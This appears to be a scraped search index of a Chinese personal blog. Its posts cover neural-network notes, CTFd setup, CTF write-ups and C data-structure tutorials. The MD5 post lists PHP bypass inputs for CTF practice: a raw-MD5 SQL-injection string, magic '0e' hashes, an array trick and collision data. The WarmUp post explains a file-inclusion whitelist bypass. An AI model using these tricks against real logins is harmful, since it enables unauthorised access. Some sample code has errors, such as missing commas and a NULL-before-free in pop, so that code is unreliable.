链式法则复合函数导数的定义 如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示 链式法则是关于复合函数的导数的性质 反向传播反向传播的计算顺序 先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点 加法节点的反向传播 加法节点的反向传播只乘以1 乘法节点的反向传播 乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游 对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"CTFd搭建","slug":"ctf_contest_platform_build","date":"2021-11-28T09:32:15.439Z","updated":"2021-11-28T09:35:07.152Z","comments":true,"path":"2021/11/28/ctf_contest_platform_build/","link":"","permalink":"http://uniqueland.top/2021/11/28/ctf_contest_platform_build/","excerpt":"CTF比赛平台搭建","text":"CTF比赛平台搭建 克隆CTFdGitHub：https://github.com/CTFd/CTFd 123456789┌──(kali㉿kali)-[/var/www/html]└─$ sudo git clone https://github.com/CTFd/CTFd.git 128 ⨯Cloning into &#x27;CTFd&#x27;...remote: Enumerating objects: 14012, done.remote: Counting objects: 100% (869/869), done.remote: Compressing objects: 100% (555/555), done.remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, done.Resolving deltas: 100% (8691/8691), done. 安装docker12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo apt install docker docker-compose 1234567┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker --versionDocker version 20.10.8+dfsg1, build 3967b7d ┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker-compose --versiondocker-compose version 1.27.4, build unknown 添加执行权限12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo chmod +x /usr/bin/docker-compose 在CTFd根目录下启动docker123456789101112131415161718192021┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo docker-compose up -d 130 ⨯Creating network &quot;ctfd_internal&quot; with the default driverCreating network &quot;ctfd_default&quot; with the default driverPulling db (mariadb:10.4.12)...10.4.12: Pulling from library/mariadb23884877105a: Pull completebc38caa0f5b9: Pull complete2910811b6c42: Pull complete36505266dcc6: Pull completee69dcc78e96e: Pull complete222f44c5392d: Pull completeefc64ea97b9c: Pull complete9912a149de6b: Pull complete7ef6cf5b5697: Pull complete8a05be3688e0: Pull completec09ffdc1b660: Pull complete2eb7fe288fc8: Pull completeb41d1cc4d40f: Pull completea92376500910: Pull complete...... 注：首次启动由于下载依赖等会比较慢 平台配置打开浏览器，输入127.0.0.1:8000配置赛事相关信息 添加题目在GitHub上找题目，clone到本地 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/CTFTraining.gitCloning into &#x27;CTFTraining&#x27;...remote: Enumerating objects: 86, done.remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, done.Resolving deltas: 100% (48/48), done. 实际测试发现不能把所有的题目都clone下来，就先试一道题 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...remote: Enumerating objects: 32, done.remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, done.Resolving deltas: 100% (3/3), done. docker images 命令查看已有镜像 docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像 12345678910111213141516┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker build ./ -t 0ctf_2016_unserialize Sending build context to Docker daemon 1.841MBStep 1/8 : FROM php:5.6-fpm-alpine5.6-fpm-alpine: Pulling from library/php169185f82c45: Pull complete 8ba0d98519aa: Pull complete 75f762bbc102: Pull complete 04f939cd9fe5: Pull complete 5feedbe48aa1: Pull complete 47e0f87348c0: Pull complete 68b7fb9d3c14: Pull complete 7e4b086d6b5d: Pull complete a15e624700d4: Pull complete f714654cc532: Pull complete Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b 123456789101112┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker images 1 ⨯REPOSITORY TAG IMAGE ID CREATED SIZE0ctf_2016_unserialize latest 931233916db0 2 minutes ago 333MBctfd_ctfd latest b36ee26f2439 49 minutes ago 791MBpython 3.7-slim-buster cd7d26aa86ac 10 days ago 113MBnginx 1.17 9beeba249f3e 18 months ago 127MBmariadb 10.4.12 b6184b68d1fd 19 months ago 357MBredis 4 191c4017dcdd 19 months ago 89.3MBubuntu 18.10 9dc19675e327 2 years ago 67.3MBphp 5.6-fpm-alpine 6feac8f2ef42 2 years ago 54.5MBphp 5-apache-jessie d34f09f63596 2 years ago 374MB 再通过镜像创建容器： 12┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize 查看现有容器： 12345678┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9cae78cf79bc 0ctf_2016_unserialize &quot;docker-php-entrypoi…&quot; 5 seconds ago Up 4 seconds 9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp 0ctf_2016_unserialize3b3889db12c7 nginx:1.17 &quot;nginx -g &#x27;daemon of…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp ctfd_nginx_17b58b9661715 ctfd_ctfd &quot;/opt/CTFd/docker-en…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp ctfd_ctfd_193e49564bff7 mariadb:10.4.12 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes ctfd_db_19f4380eb4639 redis:4 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes 访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口 打开题目容器： 1docker exec -i -t &lt;container&gt; /bin/sh 为题目添加flag： 1234567┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker exec -i -t 0ctf_2016_unserialize /bin/sh 1 ⨯/var/www/html # lsclass.php config.php index.php profile.php register.php static update.php upload www.zip/var/www/html # echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt/var/www/html # lsclass.php config.php flag.txt index.php profile.php register.php static update.php upload www.zip 最后在后台添加题目地址等信息 同理可添加其他题目 搭建中遇到的问题 git clone 命令克隆失败： 1234┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...fatal: unable to access &#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;: Failed to connect to github.com port 443: Connection refused 由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来 有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因） 1234567891011121314151617181920212223242526272829303132┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]└─$ sudo docker build ./ -t urlstorage 1 ⨯Sending build context to Docker daemon 282.6kBStep 1/7 : FROM ubuntu:18.1018.10: Pulling from library/ubuntu8a532469799e: Pull complete 32f4dcec3531: Pull complete 230f0701585e: Pull complete e01f70622967: Pull complete Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686cStatus: Downloaded newer image for ubuntu:18.10 ---&gt; 9dc19675e327Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=&quot;2.1.1&quot; ---&gt; Running in 98e854ac92f3Removing intermediate container 98e854ac92f3 ---&gt; 154a521cb653Step 3/7 : RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha ---&gt; Running in 8d702a730242Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InReleaseIgn:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InReleaseIgn:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InReleaseErr:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release 404 Not Found [IP: 101.6.15.130 80]Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release 404 Not Found [IP: 101.6.15.130 80]Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release 404 Not Found [IP: 101.6.15.130 80]Reading package lists...E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27; does not have a Release file.E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27; does not have a Release file. E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27; does not have a Release file. The command &#x27;/bin/sh -c sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27; returned a non-zero code: 100 许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"Deep Learning from Scratch","slug":"deep_learning_from_scratch","date":"2021-11-28T07:05:56.160Z","updated":"2021-11-30T14:51:29.989Z","comments":true,"path":"2021/11/28/deep_learning_from_scratch/","link":"","permalink":"http://uniqueland.top/2021/11/28/deep_learning_from_scratch/","excerpt":"读书记录","text":"读书记录 收获： 对matplotlib、numpy有了初步认识 了解了一些基础概念 跟随书本实现了简单的逻辑门电路 认识了感知机、激活函数 numpy:123456import numpy as npx = np.array([1.0,2.0,3.0]) #生成数组print(x)print(x.dtype) #查看数据类型print(x.shape) #查看矩阵形状x = x.flatten() #将矩阵转换为一维数组 matplotlib12345678910import matplotlib.pyplot as pltfrom matplotlib.image import imreadx = [1, 2, 3, 4, 5]y = [2, 4, 6, 8, 10]plt.plot(x, y) #绘制图形plt.show() #显示坐标系img = imread(&quot;lena.png&quot;)plt.imshow(img) #显示图像 基础概念 广播：将与矩阵相乘的标量转换为相应大小矩阵的功能 张量：一般化之后的向量或矩阵 感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。 简单逻辑门的实现12345678910111213141516171819202122232425262728293031323334353637import numpy as npdef AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5 -0.5]) b = 0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.2 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 感知机感知机的局限性​ 单层感知机只能表示线性空间 多层感知机的优势 多层感知机可以实现非线性空间 使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数 激活函数定义：将输入信号的总和转换为输出信号的函数 sigmoid函数：$$h(x) = \\frac{1}{(1+e^{-x})}$$ 阶跃函数： 12345def step_function(x): if x &gt; 0: return 1 else: return 0 或者 123def step_function(x): y = x &gt; 0 return y.astype(np.int) ReLU函数$$h(x)=\\begin{cases}x (x&gt;0)\\0 (x\\leq0)\\\\end{cases}$$ 恒等函数 softmax函数$$y_k=\\frac{e^}{\\sum_{i=1}^ne^{a_i}}$$","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"有关md5的一些信息","slug":"something_about_md5","date":"2021-11-23T15:56:14.073Z","updated":"2021-11-23T16:35:02.663Z","comments":true,"path":"2021/11/23/something_about_md5/","link":"","permalink":"http://uniqueland.top/2021/11/23/something_about_md5/","excerpt":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种","text":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种 在sql注入中 若遇到了类似以下的情况 123$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); 可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸 在弱类型比较中 若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零 123456789&lt;?php$a = &quot;s1502113478a&quot;;$b = &quot;s1836677006a&quot;;$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php md5.php 0e8615801632915612474043813960640e481036490867661113260034900752 在允许传递数组时 可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true 123456789&lt;?php$a = array();$b = array();$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php em_array.php PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 5PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 6 虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式： 1a[]=1 &amp; b[1]=&quot;b&quot; &amp; c[] md5碰撞 当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码 12345678910111213141516171819202122232425262728293031323334353637383940414243#!coding:utf-8hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;hexList1 = []intList1 = []asciiString1 =&#x27;&#x27;while True: intString1 = hexString1[0:2] hexString1 = hexString1[2:] hexList1.append(intString1) if (hexString1 == &#x27;&#x27;): breakfor i in hexList1: intList1.append(int(i,16))for j in intList1: asciiString1 += chr(int(j))f = open(&#x27;1.bin&#x27;,&#x27;w&#x27;)f.write(asciiString1)f.close()hexList2 = []intList2 = []asciiString2 =&#x27;&#x27;while True: intString2 = hexString2[0:2] hexString2 = hexString2[2:] hexList2.append(intString2) if (hexString2 == &#x27;&#x27;): breakfor i in hexList2: intList2.append(int(i,16))for j in intList2: asciiString2 += chr(int(j))f = open(&#x27;2.bin&#x27;,&#x27;w&#x27;)f.write(asciiString2)f.close() 1234567891011121314#!coding:utf-8import urllib.requesturlString1=&#x27;&#x27;urlString2 = &#x27;&#x27;for line in open(&#x27;1.bin&#x27;): urlString1 += urllib.parse.quote(line)for line in open(&#x27;2.bin&#x27;): urlString2 += urllib.parse.quote(line)print(urlString1)print(urlString2)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"}]},{"title":"HCTF 2018WarmUp 1","slug":"[HCTF 2018]WarmUp 1","date":"2021-11-07T15:15:57.237Z","updated":"2021-11-07T15:57:44.286Z","comments":true,"path":"2021/11/07/[HCTF 2018]WarmUp 1/","link":"","permalink":"http://uniqueland.top/2021/11/07/[HCTF%202018]WarmUp%201/","excerpt":"一上来便是一张天真无邪的笑脸","text":"一上来便是一张天真无邪的笑脸无头绪，f12查源码，发现source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 开始代码审计 网页通过对传入的参数进行过滤后进行文件包含 一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了 123456789if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; 在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。 1234567$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; 判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里 最终payload：","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"使用C语言实现栈","slug":"stack_by_C","date":"2021-09-05T14:17:42.819Z","updated":"2021-09-05T15:09:46.818Z","comments":true,"path":"2021/09/05/stack_by_C/","link":"","permalink":"http://uniqueland.top/2021/09/05/stack_by_C/","excerpt":"说明 作为栈顶的节点不存储数据","text":"说明 作为栈顶的节点不存储数据，仅作定位功能 数据项的类型可自行定义 在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已 栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现 主函数仅作各函数的演示使用，可自定义 定义相应结构 1234typedef struct node&#123; int data; struct node *next;&#125;node; 该结构由一个整型和一个指向此结构的指针组成。 定义push函数 123456789int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; top-&gt;data++; return data;&#125; 第一步：分配空间 第二步：存储数据 第三步：改变栈顶和新增项的next指针，递增top节点的data项 定义pop函数 12345678910111213int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125; 第一步：判断栈是否为空 第二步：定义变量存储待弹出的数据和待删除节点 第三步：改变栈顶的next指针 释放待删除节点空间，删除节点 定义初始化函数 为栈顶节点分配空间并初始化指针为空 1234567node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125; 定义遍历显示函数 1234567void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125; 将当前节点指向栈顶的下一个节点 当前节点不为空时进入遍历循环 打印当前节点的数据项 将当前节点指向下一个节点 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; int data; struct node *next;&#125;node;int push(node *top, int data);int pop(node *top);node* stack_init();void display(node *current);int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; return data;&#125;int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125;node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125;void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125;int main()&#123; int first_input; int pop_input, pop_data; node *top = stack_init(); int status; printf(&quot;Enter strings, Ctrl+Z to quit.\\n&quot;); status = scanf(&quot;%d&quot;,&amp;first_input); while(status!=EOF)&#123; push(top, first_input); status = scanf(&quot;%d&quot;,&amp;first_input); &#125; display(top); printf(&quot;Now enter 1 to pop data, 0 to quit.\\n&quot;); scanf(&quot;%d&quot;,&amp;pop_input); while(pop_input==1)&#123; pop_data = pop(top); if(pop_data==-1)&#123; break; &#125; printf(&quot;pop_data: %d\\n&quot;,pop_data); scanf(&quot;%d&quot;,&amp;pop_input); &#125; printf(&quot;\\nDone\\n&quot;); return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"使用C语言实现链表","slug":"link_list_by_C","date":"2021-05-02T06:13:00.666Z","updated":"2021-09-05T14:19:04.270Z","comments":true,"path":"2021/05/02/link_list_by_C/","link":"","permalink":"http://uniqueland.top/2021/05/02/link_list_by_C/","excerpt":"","text":"第一步：定义相应结构 由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点； 12345typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link; 该结构由一个字符数组，一项编号和一个指向此结构的指针组成。 第二步：定义输入函数 为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()； 1234567891011121314151617char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125; 该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针； 在函数内部，我声明了两个字符指针，一个用来接受fgets函数的返回值，一个用来接受查找字符函数(strchr)的返回值； 关于fgets()函数： 如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\\0')，使之成为一个字符串； 如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址； 需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针； 关于strchr()函数： 在某个字符数组中查找某字符，并返回指向该字符的指针 r如果字符串中不包含该字符，则返回一个空指针 经过重写，修改如下： 首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val； 第三步：编写主函数进行测试 12345678910111213141516171819202122232425int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125; 首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出； 在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除； 在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。 源代码 最后附上源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define MAX_INPUT 20char* s_gets(char* st, int n);char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != 